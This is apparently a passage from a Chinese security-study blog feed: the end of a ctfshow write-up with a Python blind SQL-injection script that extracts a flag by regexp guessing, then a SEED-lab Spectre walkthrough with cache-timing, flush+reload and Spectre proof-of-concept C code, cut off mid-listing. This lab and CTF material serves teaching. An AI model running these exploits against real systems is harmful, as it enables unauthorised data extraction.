class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">&#x27;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&#x27;</span>.<span class="hljs-built_in">format</span>(flag + x)<br>        &#125;<br><br>        response = requests.post(url=url, data=data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">&#x27;user_count = 1&#x27;</span>) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125; is right!&quot;</span>.<span class="hljs-built_in">format</span>(x))<br>            flag += x<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125; is wrong!&quot;</span>.<span class="hljs-built_in">format</span>(x))<br>            <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">if</span> flag.find(<span class="hljs-string">&#x27;&#125;&#x27;</span>) &gt; <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag:&#x27;</span>, flag)<br><span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag:&#x27;</span>, flag)<br></code></pre></td></tr></table></figure><p>结果：</p><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.4.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab12-幽灵攻击</title>
    <link href="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/"/>
    <url>/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1>实验题目</h1><p>幽灵攻击于2017年发现，并于2018年1月公开披露，它利用关键漏洞进行攻击，存在于许多现代处理器中，包括Intel、AMD和ARM处理器。漏洞允许程序突破进程间和进程内的隔离，以便恶意程序可以读取来自无法访问区域的数据。硬件保护不允许这样的访问机制（用于进程间的隔离）或软件保护机制（用于进程内的隔离），但CPU设计中存在漏洞，可能会破坏保护。因为缺陷存在于硬件中，很难从根本上解决问题，除非更换CPU。幽灵和熔断漏洞代表了CPU设计中的一种特殊类型的漏洞，它们还为安全教育提供了宝贵的一课。</p><p>本实验的学习目标是让学生获得幽灵攻击的第一手经验。攻击本身非常复杂，因此我们将其分解为几个小步骤，每个步骤都是易于理解和执行。一旦学生理解了每一步，就不难理解了把所有的东西放在一起进行实际的攻击。本实验涵盖了以下内容:幽灵攻击、侧通道攻击、CPU缓存、CPU微体系结构内的无序执行和分支预测</p><h1>实验步骤及结果</h1><h2 id="Tasks-1-and-2-Side-Channel-Attacks-via-CPU-Caches">Tasks 1 and 2: Side Channel Attacks via CPU Caches</h2><h3 id="Task-1-Reading-from-Cache-versus-from-Memory">Task 1: Reading from Cache versus from Memory</h3><p>task1可以让我们观察到从cache读和内存读差别。在CacheTime.c中有一个大小为10*4096的数组，首先访问该数组的两个元素：array[3*4096]和array[7*4096]，这两个元素会被缓存。接着从array[0*4096]读到array[9*4096]，并计算对应的读取时间。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.0.jpg" class=""><p><code>CacheTime.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">10</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// Initialize the array</span><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span>]=<span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">// FLUSH the array from the CPU cache</span><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span>]);<br><br>  <span class="hljs-comment">// Access some of the array items</span><br>  <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>*<span class="hljs-number">4096</span>] = <span class="hljs-number">100</span>;<br>  <span class="hljs-built_in">array</span>[<span class="hljs-number">7</span>*<span class="hljs-number">4096</span>] = <span class="hljs-number">200</span>;<br><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span>];<br>    time1 = __rdtscp(&amp;junk);                <br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;       <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;</span>,i, (<span class="hljs-type">int</span>)time2);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>1、编译，march标志告诉编译器启用本地机器支持的所有指令子集。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native CacheTime.c<br></code></pre></td></tr></table></figure><p>2、运行</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">./a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><p>多次运行程序，其中4次运行结果如下，通过运行结果来看，大部分情况下，读取array[3*4096]和array[7*4096]的速度明显比读取其他元素的速度要快。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.7.jpg" class=""><h3 id="Task-2-Using-Cache-as-a-Side-Channel">Task 2: Using Cache as a Side Channel</h3><p>task2实现的是使用side channel来获取受害函数的秘密值，使用的方法为FLUSH+RELOAD。实现过程如图：</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.9.jpg" class=""><p>（1）从缓存内存中刷新整个阵列，以确保该阵列没有被缓存。</p><p>（2）调用受害者函数，该函数基于秘密的值访问其中一个数组元素，这将导致缓存相应的数组元素。</p><p>（3）重新加载整个数组，并计算重新加载每个元素所需的时间。如果某个特定元素的加载时间较快，则很可能该元素已经在缓存中，那么这个元素很可能是受害者函数所访问的元素。在代码中这个阈值被设置为150。</p><p><code>FlushReload.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><span class="hljs-type">int</span> temp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> secret = <span class="hljs-number">94</span>;<br><br><span class="hljs-comment">/* cache hit time threshold assumed*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (150)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">victim</span><span class="hljs-params">()</span><br>&#123;<br>  temp = <span class="hljs-built_in">array</span>[secret*<span class="hljs-number">4096</span> + DELTA];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannel</span><span class="hljs-params">()</span> <br>&#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>     addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>     time1 = __rdtscp(&amp;junk);<br>     junk = *addr;<br>     time2 = __rdtscp(&amp;junk) - time1;<br>     <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>,i,DELTA);<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d.\n&quot;</span>,i);<br>     &#125;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>  flushSideChannel();<br>  victim();<br>  reloadSideChannel();<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>程序设定了一个阈值，当时间小于这个阈值，说明被CPU缓存了，这时这个值肯定是调用victim函数的那个值，可以把该值读取出来。</li><li>乘4096只是为了把cache块隔开，4096大于一个典型的64字节的内存块</li><li>由于缓存是块级缓存的，故不能简单定义array[256]</li><li>由于数组[0*4096]可能与相邻内存中的变量属于同一缓存块，因此可能由于缓存而意外缓存。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o FlushReload FlushReload.c<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.10.jpg" class=""><blockquote><p>:exclamation:Q</p><p>1、为什么要循环256次</p><p>要取的秘密值是一个字节，一个字节8位，一位不是0就是1，2的8次方是256，一共有256种可能</p><p>2、为什么要加delta</p><p>由于array[0*4096]可能会和其他变量使用同一个内存块，会因变量而缓存起来，为了避免这种情况同时保持程序一致性， 在所有数组上都加一个偏移</p></blockquote><h2 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction">Task 3: Out-of-Order Execution and Branch Prediction</h2><p><code>SpectreExperiment.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (150)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-type">int</span> size = <span class="hljs-number">10</span>;<br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><span class="hljs-type">uint8_t</span> temp = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d.\n&quot;</span>, i);<br>    &#125;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">victim</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; size) &#123;  <br>      temp = <span class="hljs-built_in">array</span>[x * <span class="hljs-number">4096</span> + DELTA];  <br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// FLUSH the probing array</span><br>  flushSideChannel();<br><br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim()</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;   <br>      victim(i);<br>  &#125;<br><br>  <span class="hljs-comment">// Exploit the out-of-order execution</span><br>  _mm_clflush(&amp;size);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>      _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); <br>  victim(<span class="hljs-number">97</span>);  <br><br>  <span class="hljs-comment">// RELOAD the probing array</span><br>  reloadSideChannel();<br><br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br><br></code></pre></td></tr></table></figure><p>1、编译运行SpectreExperiment.c，得到Secret值。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o SpectreExperiment SpectreExperiment.c<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.12.jpg" class=""><p>2、注释<code>_mm_clflush(&amp;size);</code>。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.13.jpg" class=""><p>再次编译运行，多次运行后仍然无法得到Secret值，因为注释掉该代码后，所取到的值都不会被CPU缓存，所以无法得到Secret值。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.14.jpg" class=""><p>3、取消注释，并修改<code>victim(i)</code>为<code>victim(i+20)</code></p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.15.jpg" class=""><p>再次编译运行，结果也是无法获取Secret值，因为此时victim函数的条件分支不会再执行，也就无法训练CPU。</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.16.jpg" class=""><h2 id="Task-4-The-Spectre-Attack">Task 4: The Spectre Attack</h2><p>task4实现的是在同一个进程中获取数据。编译运行结果如下，需要运行几次程序之后才能成功。</p><ul><li>利用分支预测可以获取秘密值，秘密值可能是不同进程的数据，那是用硬件隔离机制来保护的。如果是同一个进程的数据， 往往利用软件的沙盒机制。获取不同进程的数据难度高很多，这里是演示在同一个进程中获取数据。</li><li>浏览器中不同页面是用不同沙盒隔离开的，幽灵漏洞可以获取另一个页面的数据。</li></ul><p><strong>攻击</strong></p><p>当在浏览器中打开来自不同服务器的网页时，它们通常在同一过程中打开。在浏览器内实现的沙箱将为这些页面提供一个孤立的环境，因此其中一个页面将无法访问另一个页面的数据。大多数软件保护都依赖于条件检查来决定是否应该授予访问权限。通过Spectre攻击，我们可以让cpu执行（无序地）一个受保护的代码分支，即使条件检查失败，本质上击败了访问检查。</p><p><strong>实验设置</strong></p><p>在这个设置中，有两种类型的区域：限制区域和非限制区域。该限制是通过在下面描述的沙箱函数中实现的如果条件来实现的。沙箱函数仅当x位于缓冲区的下限和上限之间时，才为用户提供的x值返回缓冲区[x]的值。因此，此沙箱函数永远不会向用户返回限制区域内的任何内容。Experiment setup: the buffer and the protected secret：</p><img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.7.jpg" class=""><p>在限制区域中有一个秘密值（在缓冲区上方或下方），攻击者知道该秘密的地址，但攻击者不能直接访问持有该秘密值的内存。访问这个秘密的唯一方法是通过上面的沙箱功能。尽管如果x大于缓冲区大小，则永远不会执行true分支，但在微架构级别上，可以执行它，并且在恢复执行时可以留下一些痕迹。</p><p><code>SpectreAttack.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_lower = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_upper = <span class="hljs-number">9</span>;<br><span class="hljs-type">uint8_t</span> buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-type">char</span>    *secret    = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">restrictedAccess</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d(%c).\n&quot;</span>,i, i);<br>    &#125;<br>  &#125; <br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">spectreAttack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index_beyond)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span 